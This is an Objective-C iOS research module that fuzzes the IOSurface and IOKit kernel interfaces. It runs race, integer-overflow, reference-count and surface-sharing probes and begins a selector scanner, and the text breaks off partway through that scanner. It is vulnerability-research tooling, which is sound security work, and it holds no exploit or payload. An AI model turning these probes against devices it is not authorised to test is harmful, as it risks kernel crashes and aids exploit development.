//
//  IOSurfaceResearch.m
//  IOSurfaceSafeProbe
//
//  IOSurface vulnerability research module for iOS 27.
//  Detects anomalies without intentionally crashing the kernel.
//  Checkpoint files record exact state so a crash pinpoints the trigger.
//  GPL-3.0-or-later.
//

#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>
#import <QuartzCore/QuartzCore.h>
#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <dlfcn.h>
#import <stdatomic.h>
#import <libkern/OSAtomic.h>
#import <pthread.h>
#import <sys/time.h>
extern mach_port_t bootstrap_port;
extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
#include <math.h>
#import "IOSurfaceResearch.h"

#pragma mark - IOSurface / IOKit symbol types

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
typedef IOSurfaceRef (*ISR_CreateFn)(CFDictionaryRef);
typedef IOSurfaceID  (*ISR_GetIDFn)(IOSurfaceRef);
typedef IOSurfaceRef (*ISR_LookupFn)(IOSurfaceID);
typedef size_t       (*ISR_DimFn)(IOSurfaceRef);
typedef void *       (*ISR_BaseFn)(IOSurfaceRef);
typedef kern_return_t(*ISR_LockFn)(IOSurfaceRef, uint32_t, uint32_t *);

typedef uint32_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef CFMutableDictionaryRef (*ISR_MatchFn)(const char *);
typedef io_service_t  (*ISR_GetMatchFn)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*ISR_OpenFn)(io_service_t, task_t, uint32_t, io_connect_t *);
typedef kern_return_t (*ISR_CloseFn)(io_connect_t);
typedef kern_return_t (*ISR_ReleaseFn)(io_object_t);
typedef kern_return_t (*ISR_CallFn)(io_connect_t, uint32_t,
                                     const uint64_t *, uint32_t,
                                     const void *, size_t,
                                     uint64_t *, uint32_t *,
                                     void *, size_t *);

#pragma mark - Symbol loader

typedef struct {
    void *iosurface;
    void *iokit;
    ISR_CreateFn create;
    ISR_GetIDFn  getID;
    ISR_LookupFn lookup;
    ISR_DimFn    getWidth;
    ISR_DimFn    getHeight;
    ISR_DimFn    getAllocSize;
    ISR_BaseFn   getBase;
    ISR_LockFn   lock;
    ISR_LockFn   unlock;
    ISR_MatchFn  matching;
    ISR_GetMatchFn getMatch;
    ISR_OpenFn   open;
    ISR_CloseFn  close;
    ISR_ReleaseFn release;
    ISR_CallFn   call;
    ISR_DimFn    getBytesPerRow;
} ISRSymbols;

static BOOL isr_load(ISRSymbols *s) {
    memset(s, 0, sizeof(*s));
    s->iosurface = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                          RTLD_LAZY | RTLD_LOCAL);
    s->iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit",
                      RTLD_LAZY | RTLD_LOCAL);
    if (!s->iosurface || !s->iokit) return NO;
    s->create    = (ISR_CreateFn)dlsym(s->iosurface, "IOSurfaceCreate");
    s->getID     = (ISR_GetIDFn)dlsym(s->iosurface, "IOSurfaceGetID");
    s->lookup    = (ISR_LookupFn)dlsym(s->iosurface, "IOSurfaceLookup");
    s->getWidth  = (ISR_DimFn)dlsym(s->iosurface, "IOSurfaceGetWidth");
    s->getHeight = (ISR_DimFn)dlsym(s->iosurface, "IOSurfaceGetHeight");
    s->getAllocSize = (ISR_DimFn)dlsym(s->iosurface, "IOSurfaceGetAllocSize");
    s->getBase   = (ISR_BaseFn)dlsym(s->iosurface, "IOSurfaceGetBaseAddress");
    s->lock      = (ISR_LockFn)dlsym(s->iosurface, "IOSurfaceLock");
    s->unlock    = (ISR_LockFn)dlsym(s->iosurface, "IOSurfaceUnlock");
    s->matching  = (ISR_MatchFn)dlsym(s->iokit, "IOServiceMatching");
    s->getMatch  = (ISR_GetMatchFn)dlsym(s->iokit, "IOServiceGetMatchingService");
    s->open      = (ISR_OpenFn)dlsym(s->iokit, "IOServiceOpen");
    s->close     = (ISR_CloseFn)dlsym(s->iokit, "IOServiceClose");
    s->release   = (ISR_ReleaseFn)dlsym(s->iokit, "IOObjectRelease");
    s->call      = (ISR_CallFn)dlsym(s->iokit, "IOConnectCallMethod");
    s->getBytesPerRow = (ISR_DimFn)dlsym(s->iosurface, "IOSurfaceGetBytesPerRow");
    return s->create && s->getID && s->lookup && s->getWidth && s->getHeight &&
           s->getAllocSize && s->getBase && s->lock && s->unlock &&
           s->matching && s->getMatch && s->open && s->close && s->release && s->call &&
           s->getBytesPerRow;
}

static void isr_unload(ISRSymbols *s) {
    if (s->iosurface) dlclose(s->iosurface);
    if (s->iokit) dlclose(s->iokit);
    memset(s, 0, sizeof(*s));
}

#pragma mark - Stop flag

static atomic_bool g_isr_stop = false;

void iosurface_research_stop(void) {
    atomic_store(&g_isr_stop, true);
}

static BOOL isr_stopped(void) {
    return atomic_load(&g_isr_stop);
}

#pragma mark - Checkpoint helpers

static NSString *isr_docs_path(NSString *name) {
    return [NSHomeDirectory() stringByAppendingPathComponent:
            [NSString stringWithFormat:@"Documents/%@", name]];
}

static void isr_checkpoint(NSString *name, NSDictionary *state) {
    NSData *data = [NSJSONSerialization dataWithJSONObject:state options:NSJSONWritingSortedKeys error:nil];
    if (data) [data writeToFile:isr_docs_path(name) atomically:YES];
}

static NSDictionary *isr_default_surface_params(size_t w, size_t h) {
    size_t rowBytes = w * 4;
    return @{
        @"IOSurfaceWidth": @(w),
        @"IOSurfaceHeight": @(h),
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfaceBytesPerRow": @(rowBytes),
        @"IOSurfaceAllocSize": @(rowBytes * h),
        @"IOSurfacePixelFormat": @(0x42475241)
    };
}

#pragma mark - Probe 1: Race Condition Detector

typedef struct {
    ISRSymbols *sym;
    ISRLogBlock log;
    atomic_uint *anomalyCount;
    atomic_uint *idReuseCount;
    unsigned threadIndex;
    unsigned iterations;
    uint32_t *allIDs;
    atomic_uint *idWriteIndex;
    unsigned maxIDs;
} ISRRaceCtx;

static void *isr_race_worker(void *arg) {
    ISRRaceCtx *ctx = (ISRRaceCtx *)arg;
    ISRSymbols *s = ctx->sym;
    NSDictionary *params = isr_default_surface_params(64, 64);

    for (unsigned i = 0; i < ctx->iterations && !isr_stopped(); i++) {
        @autoreleasepool {
            IOSurfaceRef surf = s->create((__bridge CFDictionaryRef)params);
            if (!surf) continue;
            IOSurfaceID sid = s->getID(surf);

            unsigned idx = atomic_fetch_add(ctx->idWriteIndex, 1);
            if (idx < ctx->maxIDs) ctx->allIDs[idx] = sid;

            IOSurfaceRef ref2 = s->lookup(sid);
            CFRelease(surf);

            if (ref2) {
                size_t w = s->getWidth(ref2);
                if (w != 64) {
                    atomic_fetch_add(ctx->anomalyCount, 1);
                    ctx->log([NSString stringWithFormat:
                        @"RACE[%u]: ANOMALY width=%zu (expected 64) ID=%u iter=%u",
                        ctx->threadIndex, w, (unsigned)sid, i]);
                }
                CFRelease(ref2);
            }

            IOSurfaceRef post = s->lookup(sid);
            if (post) {
                size_t w2 = s->getWidth(post);
                if (w2 != 64) {
                    atomic_fetch_add(ctx->anomalyCount, 1);
                    ctx->log([NSString stringWithFormat:
                        @"RACE[%u]: ANOMALY post-release width=%zu ID=%u",
                        ctx->threadIndex, w2, (unsigned)sid]);
                }
                CFRelease(post);
            }
        }
    }
    return NULL;
}

void iosurface_research_race(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            log(@"RACE: === IOSurface Create/Destroy Race Detector ===");
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"RACE: FAIL cannot load symbols");
                done(@{@"status": @"FAIL", @"reason": @"symbols"});
                return;
            }

            const unsigned threadCount = 6;
            const unsigned iterPerThread = 2000;
            const unsigned maxIDs = threadCount * iterPerThread;
            uint32_t *allIDs = calloc(maxIDs, sizeof(uint32_t));
            atomic_uint idWriteIndex = 0;
            atomic_uint anomalyCount = 0;
            atomic_uint idReuseCount = 0;

            isr_checkpoint(@"ISR-Race-checkpoint.json", @{
                @"status": @"RUNNING",
                @"threads": @(threadCount),
                @"iterPerThread": @(iterPerThread)
            });

            log([NSString stringWithFormat:
                @"RACE: launching %u threads x %u iterations", threadCount, iterPerThread]);

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            pthread_t threads[6];
            ISRRaceCtx ctxs[6];
            for (unsigned t = 0; t < threadCount; t++) {
                ctxs[t] = (ISRRaceCtx){
                    .sym = &sym, .log = log,
                    .anomalyCount = &anomalyCount, .idReuseCount = &idReuseCount,
                    .threadIndex = t, .iterations = iterPerThread,
                    .allIDs = allIDs, .idWriteIndex = &idWriteIndex, .maxIDs = maxIDs
                };
                pthread_create(&threads[t], NULL, isr_race_worker, &ctxs[t]);
            }
            for (unsigned t = 0; t < threadCount; t++) {
                pthread_join(threads[t], NULL);
            }
            double elapsed = CFAbsoluteTimeGetCurrent() - start;

            unsigned totalIDs = atomic_load(&idWriteIndex);
            if (totalIDs > maxIDs) totalIDs = maxIDs;
            NSMutableSet *seen = [NSMutableSet setWithCapacity:totalIDs];
            unsigned dupes = 0;
            for (unsigned i = 0; i < totalIDs; i++) {
                NSNumber *n = @(allIDs[i]);
                if ([seen containsObject:n]) dupes++;
                else [seen addObject:n];
            }
            free(allIDs);

            unsigned anomalies = atomic_load(&anomalyCount);

            log([NSString stringWithFormat:
                @"RACE: DONE elapsed=%.3fs totalSurfaces=%u uniqueIDs=%lu duplicateIDs=%u anomalies=%u",
                elapsed, totalIDs, (unsigned long)seen.count, dupes, anomalies]);

            if (dupes > 0) {
                log([NSString stringWithFormat:
                    @"RACE: WARNING %u surfaces received recycled IDs during concurrent operation", dupes]);
            }
            if (anomalies > 0) {
                log([NSString stringWithFormat:
                    @"RACE: CRITICAL %u dimension anomalies detected — possible UAF indicator", anomalies]);
            }

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"threads": @(threadCount),
                @"totalSurfaces": @(totalIDs),
                @"uniqueIDs": @(seen.count),
                @"duplicateIDs": @(dupes),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Race-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 2: Property Corruption Scanner

void iosurface_research_properties(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            log(@"PROPS: === IOSurface Property Corruption Scanner ===");
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PROPS: FAIL cannot load symbols");
                done(@{@"status": @"FAIL", @"reason": @"symbols"});
                return;
            }

            isr_checkpoint(@"ISR-Props-checkpoint.json", @{@"status": @"RUNNING"});

            unsigned attempted = 0, created = 0, anomalies = 0, overflowRejects = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            // Phase A: Integer overflow in dimension calculations
            log(@"PROPS: Phase A — integer overflow dimension tests");
            const size_t overflowDims[] = {
                0, 1, 2, 7, 8, 15, 16, 255, 256, 1024, 4096, 16384, 65535, 65536,
                0x7FFF, 0xFFFF, 0x10000, 0x1FFFF, 0x7FFFFFFF, 0xFFFFFFFF,
                (size_t)0x100000001ULL
            };
            const unsigned nDims = sizeof(overflowDims) / sizeof(overflowDims[0]);

            for (unsigned wi = 0; wi < nDims && !isr_stopped(); wi++) {
                for (unsigned hi = 0; hi < nDims && !isr_stopped(); hi++) {
                    @autoreleasepool {
                        size_t w = overflowDims[wi], h = overflowDims[hi];
                        if (w == 0 || h == 0) {
                            // Test zero-dimension handling
                        }
                        size_t bpe = 4;
                        __uint128_t product = (__uint128_t)w * h * bpe;
                        BOOL wouldOverflow = product > (size_t)-1 || product > 256 * 1024 * 1024;
                        size_t rowBytes = (w > 0 && w <= 0x10000) ? w * bpe : 256;
                        size_t allocSize = (wouldOverflow || h == 0 || w == 0) ? 4096 : (size_t)(w * bpe * h);
                        if (allocSize > 256 * 1024 * 1024) allocSize = 256 * 1024 * 1024;

                        NSDictionary *params = @{
                            @"IOSurfaceWidth": @(w),
                            @"IOSurfaceHeight": @(h),
                            @"IOSurfaceBytesPerElement": @(bpe),
                            @"IOSurfaceBytesPerRow": @(rowBytes),
                            @"IOSurfaceAllocSize": @(allocSize),
                            @"IOSurfacePixelFormat": @(0x42475241)
                        };

                        isr_checkpoint(@"ISR-Props-checkpoint.json", @{
                            @"status": @"RUNNING",
                            @"phase": @"A",
                            @"case": @(attempted),
                            @"width": @(w),
                            @"height": @(h)
                        });

                        attempted++;
                        IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
                        if (!surf) {
                            if (wouldOverflow || w == 0 || h == 0) overflowRejects++;
                            else {
                                log([NSString stringWithFormat:
                                    @"PROPS:A UNEXPECTED_REJECT w=%zu h=%zu alloc=%zu",
                                    w, h, allocSize]);
                            }
                            continue;
                        }
                        created++;
                        IOSurfaceID sid = sym.getID(surf);
                        size_t gotW = sym.getWidth(surf);
                        size_t gotH = sym.getHeight(surf);
                        size_t gotAlloc = sym.getAllocSize(surf);

                        if (wouldOverflow && gotAlloc < allocSize) {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"PROPS:A ANOMALY overflow accepted: w=%zu h=%zu gotAlloc=%zu (asked %zu) ID=%u",
                                w, h, gotAlloc, allocSize, (unsigned)sid]);
                        }

                        // Check dimension consistency
                        if (gotW != w && w > 0 && w <= 0x10000) {
                            log([NSString stringWithFormat:
                                @"PROPS:A INFO dimension clamped: asked w=%zu got w=%zu ID=%u", w, gotW, (unsigned)sid]);
                        }
                        if (gotH != h && h > 0 && h <= 0x10000) {
                            log([NSString stringWithFormat:
                                @"PROPS:A INFO dimension clamped: asked h=%zu got h=%zu ID=%u", h, gotH, (unsigned)sid]);
                        }

                        CFRelease(surf);
                    }
                }
                if (attempted % 50 == 0) {
                    log([NSString stringWithFormat:@"PROPS:A progress %u cases", attempted]);
                }
            }

            // Phase B: Lock/unlock consistency after property read
            log(@"PROPS: Phase B — lock/unlock consistency with mismatched bytesPerRow");
            const size_t bprTests[][3] = {
                // {width, bytesPerRow, expected_behavior}
                {64, 256, 1},   // normal: 64*4=256
                {64, 128, 0},   // too small: should reject or clamp
                {64, 512, 1},   // padded: OK
                {64, 1, 0},     // absurdly small
                {64, 0, 0},     // zero
                {64, 0x7FFFFFFF, 0}, // huge
                {1, 4, 1},      // minimal
                {1, 3, 0},      // too small for 4 bpe
            };
            const unsigned nBpr = sizeof(bprTests) / sizeof(bprTests[0]);
            unsigned bprAnomalies = 0;

            for (unsigned i = 0; i < nBpr && !isr_stopped(); i++) {
                @autoreleasepool {
                    size_t w = bprTests[i][0], bpr = bprTests[i][1];
                    BOOL expectOK = bprTests[i][2] != 0;
                    size_t h = 64;
                    size_t allocSize = (bpr > 0 && bpr < 0x100000) ? bpr * h : 4096;
                    if (allocSize > 64 * 1024 * 1024) allocSize = 64 * 1024 * 1024;

                    NSDictionary *params = @{
                        @"IOSurfaceWidth": @(w),
                        @"IOSurfaceHeight": @(h),
                        @"IOSurfaceBytesPerElement": @4,
                        @"IOSurfaceBytesPerRow": @(bpr),
                        @"IOSurfaceAllocSize": @(allocSize),
                        @"IOSurfacePixelFormat": @(0x42475241)
                    };

                    isr_checkpoint(@"ISR-Props-checkpoint.json", @{
                        @"status": @"RUNNING",
                        @"phase": @"B",
                        @"case": @(i),
                        @"width": @(w),
                        @"bytesPerRow": @(bpr)
                    });

                    IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
                    if (!surf) {
                        if (expectOK) {
                            bprAnomalies++;
                            log([NSString stringWithFormat:
                                @"PROPS:B ANOMALY expected creation OK but got NULL: w=%zu bpr=%zu", w, bpr]);
                        }
                        continue;
                    }

                    // Lock, write, unlock, then verify
                    uint32_t seed = 0;
                    kern_return_t kr1 = sym.lock(surf, 0, &seed);
                    if (kr1 == KERN_SUCCESS) {
                        void *base = sym.getBase(surf);
                        if (base) {
                            uint64_t marker = 0xDEADBEEF00C0FFEELL;
                            memcpy(base, &marker, sizeof(marker));
                        }
                        sym.unlock(surf, 0, NULL);

                        // Re-lock read-only and verify
                        kern_return_t kr2 = sym.lock(surf, 1, NULL);
                        if (kr2 == KERN_SUCCESS) {
                            void *base2 = sym.getBase(surf);
                            if (base2) {
                                uint64_t readback = 0;
                                memcpy(&readback, base2, sizeof(readback));
                                if (readback != 0xDEADBEEF00C0FFEELL) {
                                    bprAnomalies++;
                                    anomalies++;
                                    log([NSString stringWithFormat:
                                        @"PROPS:B ANOMALY marker corrupted: wrote 0xDEADBEEF00C0FFEE "
                                        @"read 0x%016llx w=%zu bpr=%zu",
                                        (unsigned long long)readback, w, bpr]);
                                }
                            }
                            sym.unlock(surf, 1, NULL);
                        }
                    }
                    CFRelease(surf);
                }
            }
            anomalies += bprAnomalies;

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"PROPS: DONE attempted=%u created=%u overflowRejects=%u anomalies=%u bprAnomalies=%u elapsed=%.3fs",
                attempted, created, overflowRejects, anomalies, bprAnomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"attempted": @(attempted),
                @"created": @(created),
                @"overflowRejects": @(overflowRejects),
                @"anomalies": @(anomalies),
                @"bprAnomalies": @(bprAnomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Props-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 3: Reference Count Probe

void iosurface_research_refcount(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            log(@"REFCOUNT: === IOSurface Reference Count Probe ===");
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"REFCOUNT: FAIL cannot load symbols");
                done(@{@"status": @"FAIL", @"reason": @"symbols"});
                return;
            }

            isr_checkpoint(@"ISR-Refcount-checkpoint.json", @{@"status": @"RUNNING"});

            const unsigned nConnections = 4;
            const unsigned nTrials = 12;
            unsigned anomalies = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            CFMutableDictionaryRef criteria = sym.matching("IOSurfaceRoot");
            if (!criteria) {
                log(@"REFCOUNT: FAIL IOServiceMatching returned NULL");
                isr_unload(&sym);
                done(@{@"status": @"FAIL", @"reason": @"matching"});
                return;
            }
            io_service_t service = sym.getMatch(MACH_PORT_NULL, criteria);
            if (!service) {
                log(@"REFCOUNT: FAIL IOSurfaceRoot not visible");
                isr_unload(&sym);
                done(@{@"status": @"FAIL", @"reason": @"service"});
                return;
            }

            for (unsigned trial = 0; trial < nTrials && !isr_stopped(); trial++) {
                @autoreleasepool {
                    isr_checkpoint(@"ISR-Refcount-checkpoint.json", @{
                        @"status": @"RUNNING",
                        @"trial": @(trial),
                        @"phase": @"OPEN_CONNECTIONS"
                    });

                    // Open multiple connections
                    io_connect_t conns[4] = {0};
                    BOOL allOpened = YES;
                    for (unsigned c = 0; c < nConnections; c++) {
                        kern_return_t kr = sym.open(service, mach_task_self(), 0, &conns[c]);
                        if (kr != KERN_SUCCESS) {
                            log([NSString stringWithFormat:
                                @"REFCOUNT[%u]: FAIL open conn[%u] kr=0x%08x", trial, c, (unsigned)kr]);
                            allOpened = NO;
                            break;
                        }
                    }
                    if (!allOpened) {
                        for (unsigned c = 0; c < nConnections; c++)
                            if (conns[c]) sym.close(conns[c]);
                        continue;
                    }

                    // Create a surface and get its ID
                    NSDictionary *params = isr_default_surface_params(64, 64);
                    IOSurfaceRef creator = sym.create((__bridge CFDictionaryRef)params);
                    if (!creator) {
                        log([NSString stringWithFormat:@"REFCOUNT[%u]: FAIL create surface", trial]);
                        for (unsigned c = 0; c < nConnections; c++) sym.close(conns[c]);
                        continue;
                    }
                    IOSurfaceID sid = sym.getID(creator);

                    // Lookup from each context to add references
                    IOSurfaceRef refs[4] = {0};
                    for (unsigned c = 0; c < nConnections; c++) {
                        refs[c] = sym.lookup(sid);
                    }

                    // Write a marker while fully referenced
                    uint64_t marker = 0x00BADC0DE00FULL;
                    kern_return_t lk = sym.lock(creator, 0, NULL);
                    if (lk == KERN_SUCCESS) {
                        void *base = sym.getBase(creator);
                        if (base) memcpy(base, &marker, sizeof(marker));
                        sym.unlock(creator, 0, NULL);
                    }

                    // Release creator reference
                    CFRelease(creator);
                    creator = NULL;

                    isr_checkpoint(@"ISR-Refcount-checkpoint.json", @{
                        @"status": @"RUNNING",
                        @"trial": @(trial),
                        @"phase": @"CLOSE_ORDERED"
                    });

                    // Close connections in different orders per trial
                    unsigned closeOrder[4];
                    switch (trial % 4) {
                        case 0: closeOrder[0]=0; closeOrder[1]=1; closeOrder[2]=2; closeOrder[3]=3; break;
                        case 1: closeOrder[0]=3; closeOrder[1]=2; closeOrder[2]=1; closeOrder[3]=0; break;
                        case 2: closeOrder[0]=0; closeOrder[1]=3; closeOrder[2]=1; closeOrder[3]=2; break;
                        case 3: closeOrder[0]=2; closeOrder[1]=0; closeOrder[2]=3; closeOrder[3]=1; break;
                    }

                    for (unsigned step = 0; step < nConnections; step++) {
                        unsigned idx = closeOrder[step];

                        // Release the lookup ref before closing the connection
                        if (refs[idx]) {
                            // Check if the marker is still readable
                            if (step < nConnections - 1) {
                                kern_return_t rl = sym.lock(refs[idx], 1, NULL);
                                if (rl == KERN_SUCCESS) {
                                    void *base = sym.getBase(refs[idx]);
                                    if (base) {
                                        uint64_t readback = 0;
                                        memcpy(&readback, base, sizeof(readback));
                                        if (readback != marker) {
                                            anomalies++;
                                            log([NSString stringWithFormat:
                                                @"REFCOUNT[%u]: ANOMALY marker changed at step %u "
                                                @"(conn %u closed): wrote 0x%llx read 0x%llx",
                                                trial, step, idx,
                                                (unsigned long long)marker,
                                                (unsigned long long)readback]);
                                        }
                                    }
                                    sym.unlock(refs[idx], 1, NULL);
                                }
                            }
                            CFRelease(refs[idx]);
                            refs[idx] = NULL;
                        }

                        kern_return_t ck = sym.close(conns[idx]);
                        if (ck != KERN_SUCCESS) {
                            log([NSString stringWithFormat:
                                @"REFCOUNT[%u]: WARNING close conn[%u] at step %u kr=0x%08x",
                                trial, idx, step, (unsigned)ck]);
                        }
                        conns[idx] = 0;

                        // Can we still look it up after this connection closed?
                        IOSurfaceRef probe = sym.lookup(sid);
                        BOOL alive = probe != NULL;
                        if (probe) CFRelease(probe);

                        log([NSString stringWithFormat:
                            @"REFCOUNT[%u]: step %u closed conn[%u] surface_alive=%@",
                            trial, step, idx, alive ? @"YES" : @"NO"]);
                    }

                    // Final: surface should not be accessible
                    IOSurfaceRef finalProbe = sym.lookup(sid);
                    if (finalProbe) {
                        log([NSString stringWithFormat:
                            @"REFCOUNT[%u]: WARNING surface ID=%u still alive after all refs+conns released",
                            trial, (unsigned)sid]);
                        CFRelease(finalProbe);
                    }
                }
            }

            sym.release(service);
            double elapsed = CFAbsoluteTimeGetCurrent() - start;

            log([NSString stringWithFormat:
                @"REFCOUNT: DONE trials=%u anomalies=%u elapsed=%.3fs",
                nTrials, anomalies, elapsed]);

            if (anomalies > 0) {
                log([NSString stringWithFormat:
                    @"REFCOUNT: CRITICAL %u marker-corruption events — possible refcount imbalance", anomalies]);
            }

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"trials": @(nTrials),
                @"connections": @(nConnections),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Refcount-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 4: Cross-Process Surface Sharing Probe

void iosurface_research_sharing(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            log(@"SHARING: === Cross-Process Surface Sharing Probe ===");
            log(@"SHARING: simulates cross-process sharing via lookup-before-destroy patterns");
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"SHARING: FAIL cannot load symbols");
                done(@{@"status": @"FAIL", @"reason": @"symbols"});
                return;
            }

            isr_checkpoint(@"ISR-Sharing-checkpoint.json", @{@"status": @"RUNNING"});

            const unsigned nTrials = 24;
            unsigned anomalies = 0, danglingDetected = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            for (unsigned trial = 0; trial < nTrials && !isr_stopped(); trial++) {
                @autoreleasepool {
                    isr_checkpoint(@"ISR-Sharing-checkpoint.json", @{
                        @"status": @"RUNNING",
                        @"trial": @(trial),
                        @"phase": @"CREATE"
                    });

                    // Create surface with a known marker
                    size_t w = 64, h = 64;
                    NSDictionary *params = isr_default_surface_params(w, h);
                    IOSurfaceRef creator = sym.create((__bridge CFDictionaryRef)params);
                    if (!creator) { continue; }
                    IOSurfaceID sid = sym.getID(creator);

                    uint64_t marker = 0xCA5EFACE00000000ULL | trial;
                    kern_return_t lk = sym.lock(creator, 0, NULL);
                    if (lk == KERN_SUCCESS) {
                        void *base = sym.getBase(creator);
                        if (base) memcpy(base, &marker, sizeof(marker));
                        sym.unlock(creator, 0, NULL);
                    }

                    // Simulate "other process" getting a reference via lookup
                    unsigned nLookups = 1 + (trial % 4);
                    IOSurfaceRef lookups[4] = {0};
                    for (unsigned i = 0; i < nLookups; i++) {
                        lookups[i] = sym.lookup(sid);
                    }

                    isr_checkpoint(@"ISR-Sharing-checkpoint.json", @{
                        @"status": @"RUNNING",
                        @"trial": @(trial),
                        @"phase": @"CREATOR_RELEASE"
                    });

                    // Creator releases — simulating the creating process dying
                    CFRelease(creator);
                    creator = NULL;

                    // Check all lookup references still work
                    BOOL anyCorrupted = NO;
                    for (unsigned i = 0; i < nLookups; i++) {
                        if (!lookups[i]) continue;
                        size_t gotW = sym.getWidth(lookups[i]);
                        if (gotW != w) {
                            anomalies++;
                            anyCorrupted = YES;
                            log([NSString stringWithFormat:
                                @"SHARING[%u]: ANOMALY width=%zu (expected %zu) on lookup[%u] after creator release",
                                trial, gotW, w, i]);
                        }

                        kern_return_t rl = sym.lock(lookups[i], 1, NULL);
                        if (rl == KERN_SUCCESS) {
                            void *base = sym.getBase(lookups[i]);
                            if (base) {
                                uint64_t readback = 0;
                                memcpy(&readback, base, sizeof(readback));
                                if (readback != marker) {
                                    anomalies++;
                                    anyCorrupted = YES;
                                    log([NSString stringWithFormat:
                                        @"SHARING[%u]: ANOMALY marker corrupted: expected 0x%llx got 0x%llx "
                                        @"on lookup[%u] after creator release",
                                        trial, (unsigned long long)marker,
                                        (unsigned long long)readback, i]);
                                }
                            }
                            sym.unlock(lookups[i], 1, NULL);
                        }
                    }

                    // Release lookups one by one, checking remaining ones each time
                    for (unsigned step = 0; step < nLookups; step++) {
                        if (lookups[step]) {
                            CFRelease(lookups[step]);
                            lookups[step] = NULL;
                        }

                        isr_checkpoint(@"ISR-Sharing-checkpoint.json", @{
                            @"status": @"RUNNING",
                            @"trial": @(trial),
                            @"phase": [NSString stringWithFormat:@"RELEASE_LOOKUP_%u", step]
                        });

                        // Check remaining lookups
                        for (unsigned j = step + 1; j < nLookups; j++) {
                            if (!lookups[j]) continue;
                            size_t rw = sym.getWidth(lookups[j]);
                            if (rw != w) {
                                danglingDetected++;
                                anomalies++;
                                log([NSString stringWithFormat:
                                    @"SHARING[%u]: DANGLING width=%zu on lookup[%u] after releasing lookup[%u]",
                                    trial, rw, j, step]);
                            }
                        }
                    }

                    // Final: can we still access the surface by ID?
                    IOSurfaceRef ghost = sym.lookup(sid);
                    if (ghost) {
                        log([NSString stringWithFormat:
                            @"SHARING[%u]: INFO surface ID=%u still accessible after all refs released",
                            trial, (unsigned)sid]);
                        CFRelease(ghost);
                    }

                    log([NSString stringWithFormat:
                        @"SHARING[%u]: %@ lookups=%u",
                        trial, anyCorrupted ? @"ANOMALIES_FOUND" : @"PASS", nLookups]);
                }
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"SHARING: DONE trials=%u anomalies=%u danglingDetected=%u elapsed=%.3fs",
                nTrials, anomalies, danglingDetected, elapsed]);

            if (anomalies > 0) {
                log([NSString stringWithFormat:
                    @"SHARING: CRITICAL %u anomalies — lookup references may outlive backing memory", anomalies]);
            }

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"trials": @(nTrials),
                @"anomalies": @(anomalies),
                @"danglingDetected": @(danglingDetected),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Sharing-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 5: Mach Port IOKit Selector Scanner

void iosurface_research_mach(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            log(@"MACH: === IOSurfaceRoot Selector Scanner ===");
            log(@"MACH: testing IOConnectCallMethod selectors 0-32 with empty/small inputs");
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"MACH: FAIL cannot load symbols");
                done(@{@"status": @"FAIL", @"reason": @"symbols"});
                return;
            }

            isr_checkpoint(@"ISR-Mach-checkpoint.json", @{@"status": @"RUNNING"});

            CFMutableDictionaryRef criteria = sym.matching("IOSurfaceRoot");
            if (!criteria) {
                log(@"MACH: FAIL matching returned NULL");
                isr_unload(&sym);
